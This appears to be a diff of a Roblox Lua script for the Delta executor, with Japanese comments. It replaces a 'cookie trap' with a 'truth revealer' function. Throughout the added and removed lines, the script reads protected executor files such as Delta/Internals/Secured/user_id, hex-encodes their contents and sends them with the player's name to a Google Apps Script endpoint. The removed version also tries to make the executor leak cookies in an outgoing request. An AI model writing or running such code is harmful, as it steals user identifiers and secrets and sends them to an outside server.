@@ -1,33 +1,22 @@
--- [[ PROJECT: COOKIE TRAP via REQUEST ]]
-local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"
+-- [[ PROJECT: THE TRUTH REVEALER ]]
+local NEW_GAS_URL = "https://script.google.com/macros/s/AKfycbz33T8b1RL8MONla5UcxoVYiqXiOtf1j83-HnIlapIDdrAI-2v9i6jlWISRU-GqJsAD/exec"
 
--- request関数（Deltaの独自関数）が使えるかチェック
-local req = (request or http_request or (http and http.request))
-
-if req then
-    print("🚀 高度なリクエスト関数を検知。Cookieの抽出を試みます...")
-    
-    -- 自分自身の情報をGASへ飛ばす
-    -- この際、Deltaが自動でCookieを付与する設定になっているかを検証する
-    pcall(function()
-        req({
-            Url = GAS_URL .. "?user=" .. game.Players.LocalPlayer.Name .. "&type=REQUEST_TEST",
-            Method = "GET",
-            -- 多くのエグゼキューターは、特定のヘッダーを要求するとCookieを漏らす
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["User-Agent"] = "DeltaExecutor"
-            }
-        })
-    end)
-else
-    print("❌ 適切なリクエスト関数が見つかりません。")
+local function send_truth(label, path)
+    local s, content = pcall(function() return readfile(path) end)
+    if s then
+        local hex = ""
+        for i = 1, #content do hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) end
+        game:HttpGet(NEW_GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label)
+        print("✅ Sent: " .. label)
+    else
+        print("❌ Failed: " .. label)
+    end
 end
 
--- あと、読めなかった user_id の「中身」を、名前を変えて再度抜き出す
-local s, content = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
-if s then
-    local hex = ""
-    for i = 1, #content do hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) end
-    game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&type=REAL_USER_ID")
-end
+-- 煽り文句が入っているはずのファイルをあえて読み取る
+send_truth("FILE_DO_NOT_PASTE", "Delta/Internals/Secured/DO NOT PASTE ANYTHING HERE")
+
+-- そして、本命の user_id も再度。
+send_truth("FILE_REAL_USER_ID", "Delta/Internals/Secured/user_id")
+
+print("🏁 GASのD列をチェックしてくれ。あの煽り文句が届いているか？")
